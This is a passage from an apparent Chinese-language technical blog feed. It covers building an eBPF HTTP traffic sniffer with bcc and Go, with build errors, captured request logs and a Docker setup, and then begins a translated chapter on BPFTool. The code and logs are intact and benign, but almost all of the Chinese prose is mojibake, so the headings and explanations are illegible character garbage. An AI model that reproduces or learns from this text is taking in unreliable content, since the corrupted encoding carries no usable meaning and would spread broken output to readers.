GO.</span></span><br><span class="line"><span class="comment">// struct conn_id_t &#123;</span></span><br><span class="line"><span class="comment">//    uint32_t pid;</span></span><br><span class="line"><span class="comment">//    int32_t fd;</span></span><br><span class="line"><span class="comment">//    uint64_t tsid;</span></span><br><span class="line"><span class="comment">// &#125;;.</span></span><br><span class="line"><span class="keyword">type</span> ConnID <span class="keyword">struct</span> &#123;</span><br><span class="line">PID <span class="keyword">uint32</span></span><br><span class="line">FD   <span class="keyword">int32</span></span><br><span class="line">TsID <span class="keyword">uint64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶æˆ‘ä»¬ä¿®å¤äº†äº‹ä»¶çš„æ—¶é—´æˆ³ï¼Œå› ä¸ºå†…æ ¸æ¨¡å¼è¿”å›å•è°ƒæ—¶é’Ÿè€Œä¸æ˜¯å®æ—¶æ—¶é’Ÿï¼Œæœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨æ–°äº‹ä»¶æ›´æ–°è¿æ¥å¯¹è±¡å­—æ®µã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">socketCloseEventCallback</span><span class="params">(inputChan <span class="keyword">chan</span> []<span class="keyword">byte</span>, connectionFactory *connections.Factory)</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> data := <span class="keyword">range</span> inputChan &#123;</span><br><span class="line">      <span class="keyword">if</span> data == <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> event structs.SocketCloseEvent</span><br><span class="line">      <span class="keyword">if</span> err := binary.Read(bytes.NewReader(data), bpf.GetHostByteOrder(), &amp;event); err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Printf(<span class="string">"Failed to decode received data: %+v"</span>, err)</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      event.TimestampNano += settings.GetRealTimeOffset()</span><br><span class="line">      connectionFactory.GetOrCreate(event.ConnID).AddCloseEvent(event)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åä¸€æ­¥æ˜¯attachåˆ°é’©å­ä¸Šã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := bpfwrapper.AttachKprobes(bpfModule); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panic(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h4><h5 id="édockerç¯å¢ƒ"><a href="#édockerç¯å¢ƒ" class="headerlink" title="édockerç¯å¢ƒ"></a>édockerç¯å¢ƒ</h5><p>bccå·¥å…·å®‰è£…</p><p>Ubuntu - Source</p><p>To build the toolchain from source, one needs:</p><ul><li>LLVM 3.7.1 or newer, compiled with BPF support (default=on)</li><li>Clang, built from the same tree as LLVM</li><li>cmake (&gt;=3.1), gcc (&gt;=4.7), flex, bison</li><li>LuaJIT, if you want Lua support</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="function">For <span class="title">Focal</span> <span class="params">(<span class="number">20.04</span><span class="number">.1</span> LTS)</span></span></span><br><span class="line">sudo apt install -y bison build-essential cmake flex git libedit-dev \</span><br><span class="line">  libllvm12 llvm<span class="number">-12</span>-dev libclang<span class="number">-12</span>-dev python zlib1g-dev libelf-dev libfl-dev python3-distutils</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iovisor/bcc.git</span><br><span class="line">mkdir bcc/build; cd bcc/build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">cmake -DPYTHON_CMD=python3 .. # build python3 binding</span><br><span class="line">pushd src/python/</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">popd</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæŠ¥é”™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/ebpf-training/workshop1/capture-traffic# go run main.go ./sourcecode.c</span><br><span class="line"><span class="meta">#</span> github.com/iovisor/gobpf/bcc</span><br><span class="line">/root/go/pkg/mod/github.com/iovisor/gobpf@v0.2.0/bcc/module.go:230:132: not enough arguments in call to (_C2func_bcc_func_load)</span><br><span class="line">have (unsafe.Pointer, _Ctype_int, *_Ctype_char, *_Ctype_struct_bpf_insn, _Ctype_int, *_Ctype_char, _Ctype_uint, _Ctype_int, *_Ctype_char, _Ctype_uint, nil)</span><br><span class="line">want (unsafe.Pointer, _Ctype_int, *_Ctype_char, *_Ctype_struct_bpf_insn, _Ctype_int, *_Ctype_char, _Ctype_uint, _Ctype_int, *_Ctype_char, _Ctype_uint, *_Ctype_char, _Ctype_int)</span><br></pre></td></tr></table></figure><p>æœ€åå‘ç°æ˜¯bccç‰ˆæœ¬çš„é—®é¢˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -c http.proxy="http://192.168.19.16:17890" -b v0.21.0 https://github.com/iovisor/bcc.git</span><br></pre></td></tr></table></figure><p>å¯åŠ¨ebpf sniffer</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/ebpf-training/workshop1/capture-traffic# go run main.go ./sourcecode.c</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_accept" for "accept" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_accept" for "accept" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_accept4" for "accept4" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_accept4" for "accept4" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_write" for "write" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_write" for "write" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_read" for "read" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_read" for "read" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_close" for "close" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_close" for "close" as 1</span><br><span class="line">2022/09/29 08:19:13 Sniffer is ready</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡ç«¯ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/ebpf-training/workshop1/demo-server# go run main.go</span><br><span class="line">[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.</span><br><span class="line"> - using env:export GIN_MODE=release</span><br><span class="line"> - using code:gin.SetMode(gin.ReleaseMode)</span><br><span class="line"></span><br><span class="line">[GIN-debug] POST   /customResponse           --&gt; main.postCustomResponse (2 handlers)</span><br><span class="line">listening on 0.0.0.0:8080</span><br><span class="line">[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.</span><br><span class="line">Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.</span><br><span class="line">[GIN-debug] Listening and serving HTTP on 0.0.0.0:8080</span><br></pre></td></tr></table></figure><p>æœ¬åœ°å‘é€postè¯·æ±‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro [16:19:17] [~]</span><br><span class="line"><span class="meta">-&gt;</span> % curl -X POST http://192.168.19.198:8080/customResponse -d '&#123;"size": 100&#125;'</span><br><span class="line">&#123;"answer":"9O6aa~!NL1@U66AIh8XLtUWgVynzcXER3hyu6dKFz@LXvQ#n2WkYrn40i5ee2$4@eu$fSwvV1Y4Hkg0zgrtM07BXEMopdzcmUna7"&#125;%</span><br></pre></td></tr></table></figure><p>snifferæŸ¥çœ‹è·å–åˆ°çš„ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">========================&gt;</span><br><span class="line">Found HTTP payload</span><br><span class="line"><span class="meta">Request-&gt;</span></span><br><span class="line">POST /customResponse HTTP/1.1</span><br><span class="line">Host: 192.168.19.198:8080</span><br><span class="line">User-Agent: curl/7.77.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 13</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&#123;"size": 100&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">Response-&gt;</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Date: Thu, 29 Sep 2022 08:19:21 GMT</span><br><span class="line">Content-Length: 113</span><br><span class="line"></span><br><span class="line">&#123;"answer":"9O6aa~!NL1@U66AIh8XLtUWgVynzcXER3hyu6dKFz@LXvQ#n2WkYrn40i5ee2$4@eu$fSwvV1Y4Hkg0zgrtM07BXEMopdzcmUna7"&#125;</span><br><span class="line"></span><br><span class="line">&lt;========================</span><br></pre></td></tr></table></figure><h5 id="dockerç¯å¢ƒ"><a href="#dockerç¯å¢ƒ" class="headerlink" title="dockerç¯å¢ƒ"></a>dockerç¯å¢ƒ</h5><p>dockeré•œåƒæ‰“åŒ…ï¼Œ<code>Dockfile</code>å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">FROM golang:1.16-bullseye as builder</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br><span class="line"></span><br><span class="line"># According to https://packages.debian.org/source/sid/bpfcc,</span><br><span class="line"># BCC build dependencies:</span><br><span class="line">RUN apt-get install -y arping bison clang-format cmake dh-python \</span><br><span class="line">  dpkg-dev pkg-kde-tools ethtool flex inetutils-ping iperf \</span><br><span class="line">  libbpf-dev libclang-dev libclang-cpp-dev libedit-dev libelf-dev \</span><br><span class="line">  libfl-dev libzip-dev linux-libc-dev llvm-dev libluajit-5.1-dev \</span><br><span class="line">  luajit python3-netaddr python3-pyroute2 python3-distutils python3 git</span><br><span class="line">ENV http_proxy http://192.168.19.16:17890</span><br><span class="line">ENV https_proxy http://192.168.19.16:17890</span><br><span class="line"># Install and compile BCC</span><br><span class="line">RUN git clone https://github.com/iovisor/bcc.git</span><br><span class="line">ENV http_proxy &apos;&apos;</span><br><span class="line">ENV https_proxy &apos;&apos;</span><br><span class="line">RUN mkdir bcc/build</span><br><span class="line">WORKDIR bcc/build</span><br><span class="line">RUN cmake ..</span><br><span class="line">RUN make</span><br><span class="line">RUN make install</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t sniffer:v1</span><br></pre></td></tr></table></figure><p>dockerå¯åŠ¨ï¼Œ<code>setup_docker.sh</code>å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line"></span><br><span class="line">ROOT_DIR=$(dirname $(dirname $(realpath "$&#123;0&#125;")))</span><br><span class="line">docker run --privileged --net=host -v $&#123;ROOT_DIR&#125;:/src -w /src/workshop1/capture-traffic \</span><br><span class="line">  -v /sys:/sys -v /lib:/lib -v /usr/src:/usr/src -it --rm sniffer:v1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h4&gt;&lt;p&gt;å°±ç›®å‰è€Œè¨€ï¼Œtcpdumpæ˜¯æ•è·ç”Ÿäº§ä¸­æµé‡æœ€å¸¸è§çš„è§£å†³æ–¹æ¡ˆä¹‹ä¸€ã€‚ä½†æ˜¯ç¼ºç‚¹æ˜¯å®ƒä¸å…è®¸åº”ç”¨ç¨‹åºçº§åˆ«çš„è¿‡æ»¤(L7è¿‡æ»¤)ï¼Œå› æ­¤æ¯å½“æ•è·ç›¸å…³çš„HTTP
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨BPFçš„Linuxå¯è§‚æµ‹æ€§(ä¸‹ç¯‡)-ç¿»è¯‘</title>
    <link href="elssm.github.io/2022/05/29/%E4%BD%BF%E7%94%A8BPF%E7%9A%84Linux%E5%8F%AF%E8%A7%82%E6%B5%8B%E6%80%A7-%E4%B8%8B%E7%AF%87-%E7%BF%BB%E8%AF%91/"/>
    <id>elssm.github.io/2022/05/29/ä½¿ç”¨BPFçš„Linuxå¯è§‚æµ‹æ€§-ä¸‹ç¯‡-ç¿»è¯‘/</id>
    <published>2022-05-29T12:07:54.000Z</published>
    <updated>2022-06-04T03:06:37.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç¬¬äº”ç« èŠ‚"><a href="#ç¬¬äº”ç« èŠ‚" class="headerlink" title="ç¬¬äº”ç« èŠ‚"></a>ç¬¬äº”ç« èŠ‚</h2><h3 id="BPFå®ç”¨ç¨‹åº"><a href="#BPFå®ç”¨ç¨‹åº" class="headerlink" title="BPFå®ç”¨ç¨‹åº"></a>BPFå®ç”¨ç¨‹åº</h3><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»è®¨è®ºäº†å¦‚ä½•ç¼–å†™BPFç¨‹åºä»¥åœ¨ç³»ç»Ÿä¸­è·å¾—æ›´å¤šå¯è§æ€§ã€‚å¤šå¹´æ¥ï¼Œè®¸å¤šå¼€å‘äººå‘˜éƒ½ä½¿ç”¨BPFæ„å»ºäº†ç”¨äºç›¸åŒç›®çš„çš„å·¥å…·ã€‚åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºä¸€äº›ä½ å¯ä»¥æ¯å¤©ä½¿ç”¨çš„ç°æˆå·¥å…·ã€‚å…¶ä¸­è®¸å¤šå·¥å…·æ˜¯ä½ å·²ç»è§è¿‡çš„ä¸€äº›BPFç¨‹åºçš„é«˜çº§ç‰ˆæœ¬ã€‚è¿˜æœ‰ä¸€äº›å·¥å…·å¯ä»¥å¸®åŠ©ä½ ç›´æ¥äº†è§£è‡ªå·±çš„BPFç¨‹åºã€‚</p><p>æœ¬ç« ä»‹ç»äº†ä¸€äº›å·¥å…·ï¼Œå¯ä»¥åœ¨BPFçš„æ—¥å¸¸å·¥ä½œä¸­å¯¹ä½ æœ‰æ‰€å¸®åŠ©ã€‚æˆ‘ä»¬é¦–å…ˆä»‹ç»BPFToolï¼Œè¿™æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œç”¨äºè·å–æœ‰å…³ BPF ç¨‹åºçš„æ›´å¤šä¿¡æ¯ã€‚æˆ‘ä»¬æ¶µç›–äº†<code>BPFTrace</code>å’Œ<code>kubectl-trace</code>ï¼Œå®ƒä»¬ä¼šè®©ä½ ä½¿ç”¨ç®€æ´çš„é¢†åŸŸç‰¹å®šè¯­è¨€(DSL)æœ‰æ•ˆåœ°ç¼–å†™BPFç¨‹åºã€‚æœ€åï¼Œæˆ‘ä»¬è°ˆè°ˆ<code>eBPF Exporter</code>ï¼Œä¸€ä¸ªå°†BPFä¸Prometheusé›†æˆçš„å¼€æºé¡¹ç›®ã€‚</p><h4 id="BPFTool"><a href="#BPFTool" class="headerlink" title="BPFTool"></a>BPFTool</h4><p>BPFToolæ˜¯ä¸€ä¸ªç”¨äºæ£€æŸ¥BPFç¨‹åºå’Œæ˜ å°„çš„å†…æ ¸å®ç”¨ç¨‹åºã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥å·¥å…·ä¸ä¼šå®‰è£…åœ¨ä»»ä½•Linuxå‘è¡Œç‰ˆä¸Šï¼Œè€Œä¸”å®ƒæ­£åœ¨å¤§é‡å¼€å‘ä¸­ï¼Œå› æ­¤éœ€è¦æœ€èƒ½æ”¯æŒä½ çš„Linuxå†…æ ¸ç‰ˆæœ¬ã€‚è¿™é‡Œæˆ‘ä»¬ä»‹ç»<code>Linux 5.1</code>ç‰ˆçš„BPFToolã€‚</p><p>åœ¨æ¥ä¸‹æ¥çš„éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºå¦‚ä½•å°†BPFToolå®‰è£…åˆ°ä½ çš„ç³»ç»Ÿä¸Šï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨å®ƒæ¥è§‚å¯Ÿå’Œæ›´æ”¹BPFç¨‹åºçš„è¡Œä¸ºå’Œç»ˆç«¯ä¸­çš„æ˜ å°„ã€‚</p><h5 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> è·å–å†…æ ¸æºç ã€‚æºç ä¸‹è½½åœ°å€å¦‚ä¸‹</span></span><br><span class="line">https://mirrors.edge.kernel.org/pub/linux/kernel/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è§£å‹</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è¿›å…¥toolç›®å½•</span></span><br><span class="line">cd linux-x.x/tools/bpf/bpftool</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å®‰è£…bpf</span></span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡æ£€æŸ¥å…¶ç‰ˆæœ¬æ¥æ£€æŸ¥BPFToolæ˜¯å¦å·²æ­£ç¡®å®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool --version</span><br><span class="line">bpftool v5.17.0</span><br><span class="line">features: libbpf_strict</span><br></pre></td></tr></table></figure><h5 id="åŠŸèƒ½å±•ç¤º"><a href="#åŠŸèƒ½å±•ç¤º" class="headerlink" title="åŠŸèƒ½å±•ç¤º"></a>åŠŸèƒ½å±•ç¤º</h5><p>ä½ å¯ä»¥ä½¿ç”¨BPFToolæ‰§è¡Œçš„åŸºæœ¬æ“ä½œä¹‹ä¸€æ˜¯æ‰«æç³»ç»Ÿä»¥äº†è§£å¯ä»¥è®¿é—®å“ªäº›BPFåŠŸèƒ½ã€‚ å½“ä½ ä¸è®°å¾—å“ªä¸ªç‰ˆæœ¬çš„å†…æ ¸å¼•å…¥äº†å“ªç§ç¨‹åºæˆ–æ˜¯å¦å¯ç”¨äº†<code>BPF JIT</code>ç¼–è¯‘å™¨æ—¶ï¼Œè¿™ç§æ–¹æ³•éå¸¸æœ‰ç”¨ã€‚è¦æ‰¾å‡ºè¿™äº›é—®é¢˜ä»¥åŠè®¸å¤šå…¶ä»–é—®é¢˜çš„ç­”æ¡ˆï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool feature </span><br><span class="line">Scanning system configuration...</span><br><span class="line">bpf() syscall for unprivileged users is enabled</span><br><span class="line">JIT compiler is enabled</span><br><span class="line">JIT compiler hardening is disabled</span><br><span class="line">JIT compiler kallsyms exports are enabled for root</span><br><span class="line">...</span><br><span class="line">Scanning system call availability...</span><br><span class="line">bpf() syscall is available</span><br><span class="line">Scanning eBPF program types...</span><br><span class="line">eBPF program_type socket_filter is available</span><br><span class="line">eBPF program_type kprobe is available</span><br><span class="line">...</span><br><span class="line">Scanning eBPF map types...</span><br><span class="line">eBPF map_type hash is available</span><br><span class="line">eBPF map_type array is available</span><br><span class="line">eBPF map_type prog_array is available</span><br><span class="line">eBPF map_type perf_event_array is availab</span><br></pre></td></tr></table></figure><p>åœ¨æ­¤è¾“å‡ºä¸­å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç³»ç»Ÿå…è®¸éç‰¹æƒç”¨æˆ·æ‰§è¡Œ<code>syscall bpf</code>ï¼Œæ­¤è°ƒç”¨ä»…é™äºæŸäº›æ“ä½œã€‚ è¿˜å¯ä»¥çœ‹åˆ°JITå·²å¯ç”¨ã€‚è¾ƒæ–°ç‰ˆæœ¬çš„å†…æ ¸é»˜è®¤å¯ç”¨æ­¤JITï¼Œå®ƒå¯¹ç¼–è¯‘BPFç¨‹åºæœ‰å¾ˆå¤§å¸®åŠ©ã€‚ å¦‚æœä½ çš„ç³»ç»Ÿæ²¡æœ‰å¯ç”¨å®ƒï¼Œæ‚¨å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥å¯ç”¨å®ƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> 1 &gt; /proc/sys/net/core/bpf_jit_enable</span></span><br></pre></td></tr></table></figure><p>åŠŸèƒ½è¾“å‡ºè¿˜æ˜¾ç¤ºäº†ç³»ç»Ÿä¸­å¯ç”¨äº†å“ªäº›ç¨‹åºç±»å‹å’Œæ˜ å°„ç±»å‹ã€‚è¿™ä¸ªå‘½ä»¤æä¾›çš„ä¿¡æ¯æ¯”æˆ‘ä»¬åœ¨è¿™é‡Œå±•ç¤ºçš„è¦å¤šå¾—å¤šï¼Œæ¯”å¦‚ç¨‹åºç±»å‹å’Œè®¸å¤šå…¶ä»–é…ç½®æŒ‡ä»¤æ”¯æŒçš„BPFåŠ©æ‰‹ã€‚</p><h5 id="æ£€æŸ¥BPFç¨‹åº"><a href="#æ£€æŸ¥BPFç¨‹åº" class="headerlink" title="æ£€æŸ¥BPFç¨‹åº"></a>æ£€æŸ¥BPFç¨‹åº</h5><p>BPFToolä¸ºä½ æä¾›æœ‰å…³å†…æ ¸ä¸ŠBPFç¨‹åºçš„ç›´æ¥ä¿¡æ¯ã€‚å®ƒå…è®¸è°ƒæŸ¥ç³»ç»Ÿä¸­å·²ç»è¿è¡Œçš„å†…å®¹ã€‚è¿˜å…è®¸åŠ è½½å’Œå›ºå®šä»¥å‰ä»å‘½ä»¤è¡Œç¼–è¯‘çš„æ–°çš„BPFç¨‹åºã€‚</p><p>å­¦ä¹ å¦‚ä½•ä½¿ç”¨BPFToolå¤„ç†ç¨‹åºçš„æœ€ä½³èµ·ç‚¹æ˜¯æ£€æŸ¥ä½ åœ¨ç³»ç»Ÿä¸­è¿è¡Œçš„å†…å®¹ã€‚ä¸ºæ­¤ï¼Œå¯ä»¥è¿è¡Œå‘½ä»¤<code>bpftool prog show</code>ã€‚ å¦‚æœä½ ä½¿ç”¨<code>Systemd</code>ä½œä¸ºä½ çš„initç³»ç»Ÿï¼Œé‚£ä¹ˆå¯èƒ½å·²ç»åŠ è½½äº†ä¸€äº›BPFç¨‹åºå¹¶é™„åŠ åˆ°ä¸€äº›cgroupï¼›æˆ‘ä»¬ç¨åå†è®¨è®ºè¿™äº›ã€‚ è¿è¡Œè¯¥å‘½ä»¤çš„è¾“å‡ºå°†å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool prog show</span><br><span class="line">52: cgroup_skb  tag 7be49e3934a125ba</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br><span class="line">53: cgroup_skb  tag 2a142ef67aaad174</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br><span class="line">54: cgroup_skb  tag 7be49e3934a125ba</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 54,55</span><br></pre></td></tr></table></figure><p>å·¦ä¾§å†’å·å‰çš„æ•°å­—æ˜¯ç¨‹åºæ ‡è¯†ç¬¦ï¼›æˆ‘ä»¬ç¨åä¼šä½¿ç”¨å®ƒä»¬æ¥è°ƒæŸ¥è¿™äº›ç¨‹åºçš„å…¨éƒ¨å†…å®¹ã€‚ä»è¿™ä¸ªè¾“å‡ºä¸­è¿˜å¯ä»¥äº†è§£ç³»ç»Ÿæ­£åœ¨è¿è¡Œå“ªäº›ç±»å‹çš„ç¨‹åºã€‚åœ¨å½“å‰è¿™ç§æƒ…å†µä¸‹ï¼Œç³»ç»Ÿæ­£åœ¨è¿è¡Œä¸‰ä¸ªé™„åŠ åˆ°cgroupå¥—æ¥å­—ç¼“å†²åŒºçš„BPFç¨‹åºã€‚å¦‚æœè¿™äº›ç¨‹åºå®é™…ä¸Šæ˜¯ç”±<code>Systemd</code>å¯åŠ¨çš„ï¼Œåˆ™åŠ è½½æ—¶é—´å¯èƒ½ä¼šä¸ä½ å¯åŠ¨ç³»ç»Ÿæ—¶åŒ¹é…ã€‚ä½ è¿˜å¯ä»¥æŸ¥çœ‹è¿™äº›ç¨‹åºå½“å‰ä½¿ç”¨äº†å¤šå°‘å†…å­˜ä»¥åŠä¸å®ƒä»¬å…³è”çš„æ˜ å°„çš„æ ‡è¯†ç¬¦ã€‚ æ‰€æœ‰è¿™äº›ä¹ä¸€çœ‹éƒ½å¾ˆæœ‰ç”¨ï¼Œè€Œä¸”å› ä¸ºæˆ‘ä»¬æœ‰ç¨‹åºæ ‡è¯†ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ·±å…¥åœ°è¿›è¡Œç ”ç©¶ã€‚</p><p>ä½ å¯ä»¥å°†ç¨‹åºæ ‡è¯†ç¬¦ä½œä¸ºé¢å¤–å‚æ•°æ·»åŠ 